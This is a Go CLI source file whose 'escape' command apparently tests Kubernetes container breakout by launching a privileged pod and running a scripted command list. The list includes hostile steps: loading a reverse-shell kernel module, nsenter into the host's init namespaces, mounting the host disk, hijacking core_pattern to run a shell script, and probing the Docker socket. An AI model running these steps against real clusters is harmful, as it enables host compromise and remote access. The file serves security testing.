package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	app "main/internal/app"
	"time"

	"github.com/spf13/cobra"

	// auth plugins for kubeconfig (gcp, oidc, etc.)
	_ "k8s.io/client-go/plugin/pkg/client/auth"
)

var (
	kubeconfig string
	namespace  string
	image      string
	timeout    time.Duration
	stopper    bool
)

func init() {
	rootCmd.AddCommand(escapeCmd)

	escapeCmd.Flags().StringVar(&kubeconfig, "kubeconfig", "", "path to kubeconfig file (default KUBECONFIG or $HOME/.kube/config)")
	escapeCmd.Flags().StringVarP(&namespace, "namespace", "n", "default", "namespace for test pod")
	escapeCmd.Flags().StringVarP(&image, "image", "i", "nicolaka/netshoot:latest", "image to use for test pod")
	escapeCmd.Flags().DurationVarP(&timeout, "timeout", "t", 3*time.Minute, "overall timeout for the test")
	escapeCmd.Flags().BoolVarP(&stopper, "stopper", "s", false, "waits for the user to press a key after each command is executed, allowing them to be executed step by step")
}

var escapeCmd = &cobra.Command{
	Use:   "escape",
	Short: "Run single escape test (creates privileged pod, mounts host root, execs checks)",
	RunE: func(cmd *cobra.Command, args []string) error {
		cfg, clientset, err := app.GetKubeconfig(kubeconfig)

		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		commands := [][]string{
			{"id"},
			{"uname", "-a"},
			{"cat", "/proc/1/cgroup"},
			{"cat", "/proc/self/status"},
			{"insmod", "/test/reverse_shell.ko"},
			{"nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"},
			{"mkdir", "-p", "/mnt/hostfs"},
			{"mount", "/dev/vda1", "/mnt/hostfs"},
			{"ls", "-lah", "/mnt/hostfs/"},
			{"echo", "|$overlay/shell.sh", ">", "/proc/sys/kernel/core_pattern"},
			{"ls", "/var/run/docker.socket"},
			//GDB
			{"cat", "/etc/mtab"},
		}

		results, err := app.ExecCommands(ctx, clientset, image, commands, cfg, namespace, stopper)
		if err != nil {
			fmt.Println(err)
		}

		out := map[string]interface{}{
			"results": results,
		}

		enc, _ := json.MarshalIndent(out, "", "  ")
		fmt.Println(string(enc))
		return nil
	},
}
